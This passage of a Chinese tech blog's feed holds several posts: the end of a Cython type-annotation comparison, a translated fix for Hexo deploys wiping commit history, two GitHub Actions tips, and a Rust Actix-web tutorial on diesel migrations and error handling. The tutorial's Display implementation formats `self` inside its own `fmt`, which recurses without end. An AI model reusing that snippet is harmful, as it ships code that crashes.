PyTuple_GET_SIZE(__pyx_t_2)) <span class="keyword">break</span>;</span><br><span class="line">        <span class="meta">#<span class="keyword">if</span> CYTHON_ASSUME_SAFE_MACROS &amp;&amp; !CYTHON_AVOID_BORROWED_REFS</span></span><br><span class="line">        __pyx_t_5 = PyTuple_GET_ITEM(__pyx_t_2, __pyx_t_3); __Pyx_INCREF(__pyx_t_5); __pyx_t_3++; <span class="keyword">if</span> (unlikely(<span class="number">0</span> &lt; <span class="number">0</span>)) __PYX_ERR(<span class="number">0</span>, <span class="number">6</span>, __pyx_L1_error)</span><br><span class="line">        <span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        __pyx_t_5 = PySequence_ITEM(__pyx_t_2, __pyx_t_3); __pyx_t_3++; <span class="keyword">if</span> (unlikely(!__pyx_t_5)) __PYX_ERR(<span class="number">0</span>, <span class="number">6</span>, __pyx_L1_error)</span><br><span class="line">        __Pyx_GOTREF(__pyx_t_5);</span><br><span class="line">        <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      __pyx_t_5 = __pyx_t_4(__pyx_t_2);</span><br><span class="line">      <span class="keyword">if</span> (unlikely(!__pyx_t_5)) &#123;</span><br><span class="line">        PyObject* exc_type = PyErr_Occurred();</span><br><span class="line">        <span class="keyword">if</span> (exc_type) &#123;</span><br><span class="line">          <span class="keyword">if</span> (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();</span><br><span class="line">          <span class="keyword">else</span> __PYX_ERR(<span class="number">0</span>, <span class="number">6</span>, __pyx_L1_error)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      __Pyx_GOTREF(__pyx_t_5);</span><br><span class="line">    &#125;</span><br><span class="line">    __Pyx_XDECREF_SET(__pyx_v_x, __pyx_t_5);</span><br><span class="line">    __pyx_t_5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (unlikely(__Pyx_ListComp_Append(__pyx_t_1, (PyObject*)__pyx_v_x))) __PYX_ERR(<span class="number">0</span>, <span class="number">6</span>, __pyx_L1_error)</span><br><span class="line">  &#125;</span><br><span class="line">  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = <span class="number">0</span>;</span><br><span class="line">  __Pyx_DECREF_SET(__pyx_v_ips, __pyx_t_1);</span><br><span class="line">  __pyx_t_1 = <span class="number">0</span>;</span><br></pre></td></tr></table></figure></li></ul><p>主要区别在于，类型注释增加了变量检测 <code>__Pyx_ArgTypeTest</code> ，以及之后赋值 ips 时的类型检测 <code>PyString_CheckExact</code>；没有变量类型注释则进行了变量推测，判断是否为List（ <code>PyList_CheckExact</code>）或者Tuple （ <code>PyTuple_CheckExact</code>），还是可迭代类型。</p><h2><span id="jie-lun">结论</span></h2><ol><li>类型注释在编译后会简化处理流程；</li><li>类型注释的变量不能赋值为其他类型。</li></ol><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Python 函数变量类型注释会导致用 Cython 编译后执行与直接执行结果不一致
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Hexo git deployer 删除了提交历史记录该怎么整？</title>
    <link href="https://qiwihui.com/qiwihui-blog-50/"/>
    <id>https://qiwihui.com/qiwihui-blog-50/</id>
    <published>2022-08-13T01:54:25.700Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>原文：<a href="https://e.printstacktrace.blog/hexo-git-deployer-removes-commits-history-lets-do-something-about-that/">Hexo git deployer removes commits history? Let’s do something about that!</a></p><p>我发现 <a href="https://hexo.io/">Hexo</a> 是构建博客和应用许多知名的软件开发原则的好工具，其中之一是自动化。这就是我决定将此博客与 <a href="https://travis-ci.org/wololock/wololock.github.io">Travis CI</a> 集成以执行 GitHub pages 部署的原因。但几天之后我注意到一个重要问题 - 从 CI 服务器部署新版本的博客导致从 <code>master</code> 分支中删除所有提交并从一次又一次地初始化提交开始。我花了一段时间才找到解决这个问题的工作方案。这篇博文解释了这个问题的简单解决方案。</p><span id="more"></span><h3><span id="wei-shi-me-hexo-deploy-hui-shou-xian-shan-chu-li-shi-ji-lu">为什么 <code>hexo deploy</code> 会首先删除历史记录？</span></h3><p>让我们从了解实际发生的事情开始。当你为 git 部署选项运行 <code>hexo deploy</code> [1]命令时，Hexo 会创建一个名为 <code>.deploy_git</code> 的隐藏文件夹，并将生成的文件从 <code>public</code> 文件夹复制到该文件夹。接下来，它初始化目标为 Hexo 远程部署分支的git存储库（如果它尚不存在），并从该文件夹执行 <code>git push --force</code> 到仓库和你在 <code>_config.yml</code> [2]文件中定义的分支。</p><p>清单1. 博客的部署配置</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">git@github.com:wololock/wololock.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure><p>如果你从本地计算机构建和部署博客，并且永远不会删除（或意外丢失）你的博客源代码，你可能永远不会遇到此问题。当你从未被擦除的工作空间执行此操作时，则存在具有完整历史记录的文件夹 <code>.deploy_git</code>，并且 <code>hexo deploy</code> 仅推送实际修改的那些文件。当你迁移到像 <code>Travis CI</code> 这样的 CI 服务器时，这就变了，因为它使用干净的工作区和仓库的新克隆执行构建。在这种情况下，<code>.deploy_git</code> 文件夹根本不存在，将从头开始重新创建。</p><h3><span id="na-me-ru-he-bu-shu-he-bao-cun-li-shi-ni">那么如何部署和保存历史呢？</span></h3><p>我发现解决方案非常简单。以前我负责部署的 <code>.travis.yml</code> 文件部分看起来像这样：</p><p>清单2. 以前的 <code>Travis CI</code> 部署配置</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">skip_cleanup:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">provider:</span> <span class="string">script</span></span><br><span class="line">  <span class="attr">script:</span> <span class="string">hexo</span> <span class="string">deploy</span></span><br><span class="line">  <span class="attr">on:</span></span><br><span class="line">    <span class="attr">branch:</span> <span class="string">develop</span></span><br></pre></td></tr></table></figure><p>只要我将更改推送到 <code>develop</code> 分支，它就会触发 <code>hexo deploy</code>。在这种情况下，它最终创建了一个新的 <code>.deploy_git</code> 文件夹并强制将初始提交推送到 GitHub 仓库。然后，我做了一个小改进 - 我创建了一个简短的 bash 脚本。</p><p>清单3. 部署博客使用的脚本</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用已部署文件初始化目标</span></span><br><span class="line"><span class="string">git</span> <span class="string">clone</span> <span class="string">--depth</span> <span class="number">1</span> <span class="string">--branch=master</span> <span class="string">https://github.com/wololock/wololock.github.io.git</span> <span class="string">.deploy_git</span></span><br><span class="line"></span><br><span class="line"><span class="string">cd</span> <span class="string">.deploy_git</span></span><br><span class="line"></span><br><span class="line"><span class="string">＃从</span> <span class="string">../public/</span> <span class="string">复制之前删除所有文件</span></span><br><span class="line"><span class="comment"># 这样 git 可以跟踪上次提交中删除的文件</span></span><br><span class="line"><span class="string">find</span> <span class="string">.</span> <span class="string">-path</span> <span class="string">./.git</span> <span class="string">-prune</span> <span class="string">-o</span> <span class="string">-exec</span> <span class="string">rm</span> <span class="string">-rf</span> &#123;&#125; <span class="string">\;</span> <span class="number">2</span><span class="string">&gt;</span> <span class="string">/dev/null</span></span><br><span class="line"></span><br><span class="line"><span class="string">cd</span> <span class="string">../</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 部署</span></span><br><span class="line"><span class="string">hexo</span> <span class="string">clean</span></span><br><span class="line"><span class="string">hexo</span> <span class="string">deploy</span></span><br></pre></td></tr></table></figure><p>这个脚本完全按照它在注释中所说的那样做：</p><ul><li>它将 <code>master</code> 分支从远程存储库克隆到 <code>.deploy_git</code> 以获取现有提交历史记录。</li><li>然后它从 <code>.deploy_git</code> 中删除所有非 git 对象存储库文件，因此从 <code>public</code> 文件夹复制文件将跟踪已删除的文件。</li><li>最后 - 它执行常规部署的 <code>hexo deploy</code> 命令。</li></ul><p>最后，这是在引入部署bash脚本后的部署配置部分：</p><p>清单4. 当前的 <code>Travis CI</code> 部署配置</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">skip_cleanup:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">provider:</span> <span class="string">script</span></span><br><span class="line">  <span class="attr">script:</span> <span class="string">sh</span> <span class="string">deploy.sh</span></span><br><span class="line">  <span class="attr">on:</span></span><br><span class="line">    <span class="attr">branch:</span> <span class="string">develop</span></span><br></pre></td></tr></table></figure><p>由于这个解决方案，我能够保留站点更新的历史记录，并跟踪使用给定站点更新实际修改的文件的更改。</p><p><img src="https://e.printstacktrace.blog/images/github-hexo-history.png" alt="github hexo history"></p><h3><span id="zui-hou-de-hua">最后的话</span></h3><p>我希望你发现这篇文章很有用。它描述了 Hexo + Travis CI + GitHub 用例的解决方案，但它可以解决从 CI 服务器环境运行时其他类似静态站点生成器可能遇到的问题。</p><h3><span id="can-kao">参考</span></h3><ol><li>Documentation: <a href="https://hexo.io/docs/deployment">https://hexo.io/docs/deployment</a></li><li><a href="https://github.com/wololock/wololock.github.io/blob/develop/_config.yml#L88-L93">https://github.com/wololock/wololock.github.io/blob/develop/_config.yml#L88-L93</a></li></ol><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Hexo git deployer 删除了提交历史记录该怎么整？
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="翻译" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions 第4天：安装工具</title>
    <link href="https://qiwihui.com/qiwihui-blog-87/"/>
    <id>https://qiwihui.com/qiwihui-blog-87/</id>
    <published>2022-08-13T01:54:25.700Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>昨天我提到 GitHub Actions 提供了 <a href="https://qiwihui.com/qiwihui-blog-86/">Linux，Windows 和 macOS 虚拟环境</a>，你可以在其中运行工作流。</p><p>但是这些环境上实际安装了什么？ 原来有<a href="https://help.github.com/en/actions/automating-your-workflow-with-github-actions/software-installed-on-github-hosted-runners">很多安装</a>。</p><p>团队试图通过许多不同的平台使我们的运行器（runners）保持最新状态。 因此，你会发现许多不同版本的Python，Ruby，.NET Core等。 但是──仅仅依靠这些各种各样的开发工具──他们不可能绝对安装所有东西。</p><p>有时你需要自己安装。而且由于你拥有一台完整的虚拟机，因此对于每项作业执行，你都可以在其上安装任何所需的软件。</p><span id="more"></span><p>例如，你可能要安装非常好的“<a href="https://ninja-build.org/">ninja</a>”构建工具。</p><h3><span id="linux">Linux</span></h3><p>Linux虚拟环境运行Ubuntu，因此你可以使用 <a href="https://en.wikipedia.org/wiki/APT_(Package_Manager)">apt</a> 安装可能需要的任何其他工具。 默认情况下，你以非 root 用户身份运行，但是可以使用无密码 sudo。这样你就可以：</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">run:</span> <span class="string">sudo</span> <span class="string">apt-get</span> <span class="string">install</span> <span class="string">ninja-build</span></span><br></pre></td></tr></table></figure><h3><span id="windows">Windows</span></h3><p><a href="https://chocolatey.org/">Chocolatey</a> 是 Windows 的首选软件包管理器，它已安装并可以在 GitHub Actions 虚拟环境中使用。</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">run:</span> <span class="string">choco</span> <span class="string">install</span> <span class="string">ninja</span></span><br></pre></td></tr></table></figure><h3><span id="macos">macOS</span></h3><p>在 macOS 上，<a href="https://brew.sh/">Homebrew</a> 是推荐的软件包管理器，可在 GitHub Actions 虚拟环境中使用。无需以 root 用户身份运行 Homebrew ──实际上，这是不合时宜的，因此您可以执行 <code>brew install</code>：</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">run:</span> <span class="string">brew</span> <span class="string">install</span> <span class="string">ninja</span></span><br></pre></td></tr></table></figure><h3><span id="he-zai-yi-qi">合在一起</span></h3><p>综上所述，如果你想在所有三个平台上安装 ninja，你的工作流程将<a href="https://gist.github.com/ethomson/68a7e60b9b5fbe081c8edd65237a2f22">如下所示</a>：</p><script src="https://gist.github.com/ethomson/68a7e60b9b5fbe081c8edd65237a2f22.js"></script><p>原文链接：<a href="https://www.edwardthomson.com/blog/github_actions_4_installing_tools.html">https://www.edwardthomson.com/blog/github_actions_4_installing_tools.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions 第4天：安装工具
    
    </summary>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="翻译" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions 第14天：矩阵条件</title>
    <link href="https://qiwihui.com/qiwihui-blog-97/"/>
    <id>https://qiwihui.com/qiwihui-blog-97/</id>
    <published>2022-08-13T01:54:25.700Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>GitHub Actions 具有许多强大的组件，但是当你开始一起使用它们时，事情就开始变得真正强大。例如：矩阵工作流使你可以轻松地将简单的工作流扩展到多个不同的作业。通过条件执行，你可以限制作业中步骤的执行。</p><p>这两个功能很自然地结合在一起──当你跨不同的操作系统，平台或语言版本构建矩阵时，可能只需要在该矩阵的一个子集上运行一些步骤。例如：在Linux上运行时，可能需要安装其他编译器，或者对于不同的操作系统，可能需要安装稍有不同的依赖项。</p><p>我可以结合一些以前的概念来为我的一个项目（C语言中的系统库）构建工作流。它将使用<a href="https://qiwihui.com/qiwihui-blog-86/">跨平台</a>和<a href="https://qiwihui.com/qiwihui-blog-87/">工具安装</a>的<a href="https://qiwihui.com/qiwihui-blog-85/">矩阵工作流</a>来执行CI的构建和测试步骤。</p><span id="more"></span><p>目标是安装Ninja构建系统，然后使用CMake创建构建脚本以利用这一优势──CMake和Ninja可以很好地协同工作，以生成快速，跨平台的本机构建。最后，我们将使用 <code>cmake</code> 进行构建，并使用 <code>ctest</code> 进行测试。</p><script src="https://gist.github.com/ethomson/79c787cecee5c23f2c791500d6644583.js"></script><p>运行此命令时，条件将确保仅对特定平台运行适当的“安装依赖项”步骤。其他平台的其他步骤将被跳过。</p><p><img src="https://user-images.githubusercontent.com/3297411/77774001-58bd8c80-7085-11ea-8a82-90115b7ba69f.png" alt="image"></p><p>现在，我们开始了解如何将GitHub Actions的简单片段组合到更复杂，功能更强大的工作流程中。</p><p>原文链接：<a href="https://www.edwardthomson.com/blog/github_actions_14_conditionals_with_a_matrix.html">https://www.edwardthomson.com/blog/github_actions_14_conditionals_with_a_matrix.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions 第14天：矩阵条件
    
    </summary>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="翻译" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>用 Rust Actix-web 写一个 Todo 应用（三）── migrations 和错误处理</title>
    <link href="https://qiwihui.com/qiwihui-blog-107/"/>
    <id>https://qiwihui.com/qiwihui-blog-107/</id>
    <published>2022-08-13T01:54:25.690Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="shi-yong-diesel-guan-li-shu-ju-ku-bian-hua">使用 diesel 管理数据库变化</span></h2><p>diesel 是一个用 rust 写的 ORM 库，支持多种数据库，同时 diesel 提供了对数据库结构的管理功能。我们将使用 diesel 对我们的数据库结构变化进行管理。</p><span id="more"></span><p>首先，安装命令行工具 <code>diesel_cli</code>，并初始化数据库设置</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装 diesel_cli，支持 postgres</span></span><br><span class="line">cargo install diesel_cli --no-default-features --features postgres</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置数据库连接</span></span><br><span class="line">echo DATABASE_URL=postgres://actix:actix@localhost:5432/actix &gt;&gt; .env</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成 diesel.toml 文件指向 schema 所在</span></span><br><span class="line">diesel setup</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建数据库 migration</span></span><br><span class="line">diesel migration generate create_db</span><br></pre></td></tr></table></figure><p>在生成的 <code>migrations</code> 目录中，填入数据库变化的 sql 语句，<code>up.sql</code> 用于修改，<code>down.sql</code> 用于撤销修改。</p><p><code>up.sql</code>：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> todo_list (</span><br><span class="line">    id serial <span class="keyword">primary</span> key,</span><br><span class="line">    title <span class="type">varchar</span>(<span class="number">150</span>) <span class="keyword">not</span> <span class="keyword">null</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> todo_item (</span><br><span class="line">    id serial <span class="keyword">primary</span> key,</span><br><span class="line">    title <span class="type">varchar</span>(<span class="number">150</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    checked <span class="type">boolean</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">default</span> <span class="literal">false</span>,</span><br><span class="line">    list_id <span class="type">integer</span> <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    <span class="keyword">foreign</span> key (list_id) <span class="keyword">references</span> todo_list(id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><code>down.sql</code>：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> if <span class="keyword">exists</span> todo_item;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> if <span class="keyword">exists</span> todo_list;</span><br></pre></td></tr></table></figure><p>由于之前已经有对应的数据表结构，需要将原来的表结构删除，再运行数据库变更：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除原有的数据表之后</span></span><br><span class="line">diesel migrations run</span><br></pre></td></tr></table></figure><p>其中，对应生成的 schema 为：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">table! &#123;</span><br><span class="line">    <span class="title function_ invoke__">todo_item</span> (id) &#123;</span><br><span class="line">        id <span class="punctuation">-&gt;</span> Int4,</span><br><span class="line">        title <span class="punctuation">-&gt;</span> Varchar,</span><br><span class="line">        checked <span class="punctuation">-&gt;</span> Bool,</span><br><span class="line">        list_id <span class="punctuation">-&gt;</span> Int4,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">table! &#123;</span><br><span class="line">    <span class="title function_ invoke__">todo_list</span> (id) &#123;</span><br><span class="line">        id <span class="punctuation">-&gt;</span> Int4,</span><br><span class="line">        title <span class="punctuation">-&gt;</span> Varchar,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">joinable!(todo_item <span class="punctuation">-&gt;</span> <span class="title function_ invoke__">todo_list</span> (list_id));</span><br><span class="line"></span><br><span class="line">allow_tables_to_appear_in_same_query!(</span><br><span class="line">    todo_item,</span><br><span class="line">    todo_list,</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>此时，数据库中的表机构就和我们之前是一样的，同时增加了一个用于记录已经做过的 migrations 的数据库。</p><h2><span id="orm">ORM</span></h2><p>鉴于 diesel 没有 async 版本，以及 quaint 不是 type-safe，不做 ORM 的支持。</p><h2><span id="cuo-wu-chu-li">错误处理</span></h2><p>自定义错误，并将常见的错误统一处理。</p><p>新增 <code>errors.rs</code>：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> actix_web::http::StatusCode;</span><br><span class="line"><span class="keyword">use</span> actix_web::&#123;HttpResponse, ResponseError&#125;;</span><br><span class="line"><span class="keyword">use</span> deadpool_postgres::PoolError;</span><br><span class="line"><span class="keyword">use</span> serde::&#123;Deserialize, Serialize&#125;;</span><br><span class="line"><span class="keyword">use</span> std::fmt;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Debug)]</span></span><br><span class="line"><span class="meta">#[allow(dead_code)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">enum</span> <span class="title class_">Error</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">InternalServerError</span>(<span class="type">String</span>),</span><br><span class="line">    <span class="title function_ invoke__">NotFound</span>(<span class="type">String</span>),</span><br><span class="line">    <span class="title function_ invoke__">PoolError</span>(<span class="type">String</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Debug, Serialize, Deserialize)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">ErrorResponse</span> &#123;</span><br><span class="line">    errors: <span class="type">Vec</span>&lt;<span class="type">String</span>&gt;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">fmt</span>::Display <span class="keyword">for</span> <span class="title class_">Error</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">fmt</span>(&amp;<span class="keyword">self</span>, f: &amp;<span class="keyword">mut</span> fmt::Formatter&lt;<span class="symbol">&#x27;_</span>&gt;) <span class="punctuation">-&gt;</span> fmt::<span class="type">Result</span> &#123;</span><br><span class="line">        <span class="built_in">write!</span>(f, <span class="string">&quot;&#123;&#125;&quot;</span>, <span class="keyword">self</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">ResponseError</span> <span class="keyword">for</span> <span class="title class_">Error</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">error_response</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> HttpResponse &#123;</span><br><span class="line">        <span class="keyword">match</span> <span class="keyword">self</span> &#123;</span><br><span class="line">            Error::<span class="title function_ invoke__">NotFound</span>(message) =&gt; &#123;</span><br><span class="line">                HttpResponse::<span class="title function_ invoke__">NotFound</span>().json::&lt;ErrorResponse&gt;(message.<span class="title function_ invoke__">into</span>())</span><br><span class="line">            &#125;</span><br><span class="line">            _ =&gt; HttpResponse::<span class="title function_ invoke__">new</span>(StatusCode::INTERNAL_SERVER_ERROR),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 支持 字符串 into</span></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">From</span>&lt;&amp;<span class="type">String</span>&gt; <span class="keyword">for</span> <span class="title class_">ErrorResponse</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">from</span>(error: &amp;<span class="type">String</span>) <span class="punctuation">-&gt;</span> <span class="keyword">Self</span> &#123;</span><br><span class="line">        ErrorResponse &#123;</span><br><span class="line">            errors: <span class="built_in">vec!</span>[error.<span class="title function_ invoke__">into</span>()],</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理 PoolError</span></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">From</span>&lt;PoolError&gt; <span class="keyword">for</span> <span class="title class_">Error</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">from</span>(error: PoolError) <span class="punctuation">-&gt;</span> <span class="keyword">Self</span> &#123;</span><br><span class="line">        Error::<span class="title function_ invoke__">PoolError</span>(error.<span class="title function_ invoke__">to_string</span>())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改 <code>db.rs</code>：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">+<span class="keyword">use</span> crate::errors::Error;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">-        <span class="literal">None</span> =&gt; <span class="title function_ invoke__">Err</span>(Error::<span class="title function_ invoke__">new</span>(ErrorKind::NotFound, <span class="string">&quot;Not found&quot;</span>)),</span><br><span class="line">+        <span class="literal">None</span> =&gt; <span class="title function_ invoke__">Err</span>(Error::<span class="title function_ invoke__">NotFound</span>(<span class="string">&quot;Not found&quot;</span>.<span class="title function_ invoke__">into</span>())),</span><br></pre></td></tr></table></figure><p>修改 <code>handlers.rs</code>，其中一个请求处理</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">+<span class="keyword">use</span> crate::errors::Error;</span><br><span class="line"><span class="comment">// error_response：items from traits can only be used if the trait is in scope</span></span><br><span class="line">+<span class="keyword">use</span> actix_web::ResponseError;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">-<span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">todos</span>(state: web::Data&lt;AppState&gt;) <span class="punctuation">-&gt;</span> <span class="keyword">impl</span> <span class="title class_">Responder</span> &#123;</span><br><span class="line">+<span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">todos</span>(state: web::Data&lt;AppState&gt;) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;HttpResponse, Error&gt; &#123;</span><br><span class="line">     <span class="keyword">let</span> <span class="variable">client</span>: Client = state</span><br><span class="line">         .pool</span><br><span class="line">         .<span class="title function_ invoke__">get</span>()</span><br><span class="line">@@ -<span class="number">33</span>,<span class="number">12</span> +<span class="number">34</span>,<span class="number">15</span> @@ <span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">todos</span>(state: web::Data&lt;AppState&gt;) <span class="punctuation">-&gt;</span> <span class="keyword">impl</span> <span class="title class_">Responder</span> &#123;</span><br><span class="line">         .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Error connecting to the database&quot;</span>);</span><br><span class="line">     <span class="keyword">let</span> <span class="variable">result</span> = db::<span class="title function_ invoke__">get_todos</span>(&amp;client).<span class="keyword">await</span>;</span><br><span class="line">     <span class="keyword">match</span> result &#123;</span><br><span class="line">-        <span class="title function_ invoke__">Ok</span>(todos) =&gt; HttpResponse::<span class="title function_ invoke__">Ok</span>().<span class="title function_ invoke__">json</span>(todos),</span><br><span class="line">-        <span class="title function_ invoke__">Err</span>(_) =&gt; HttpResponse::<span class="title function_ invoke__">InternalServerError</span>().<span class="title function_ invoke__">into</span>(),</span><br><span class="line">+        <span class="title function_ invoke__">Ok</span>(todos) =&gt; <span class="title function_ invoke__">Ok</span>(HttpResponse::<span class="title function_ invoke__">Ok</span>().<span class="title function_ invoke__">json</span>(todos)),</span><br><span class="line">+        <span class="title function_ invoke__">Err</span>(e) =&gt; <span class="title function_ invoke__">Ok</span>(e.<span class="title function_ invoke__">error_response</span>()),</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2><span id="xiao-jie">小结</span></h2><ol><li>管理数据库结构变更；</li><li>自定义错误处理</li></ol><h2><span id="can-kao-wen-dang-he-xiang-mu">参考文档和项目</span></h2><ol><li><a href="https://www.youtube.com/watch?v=gQwA0g0NNSI">Creating a simple TODO service with Actix</a></li><li><a href="actix.rs">actix-web 官方文档</a></li><li><a href="https://github.com/actix/examples">官方 actix-web 示例</a></li></ol><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      用 Rust Actix-web 写一个 Todo 应用（三）── migrations 和错误处理
    
    </summary>
    
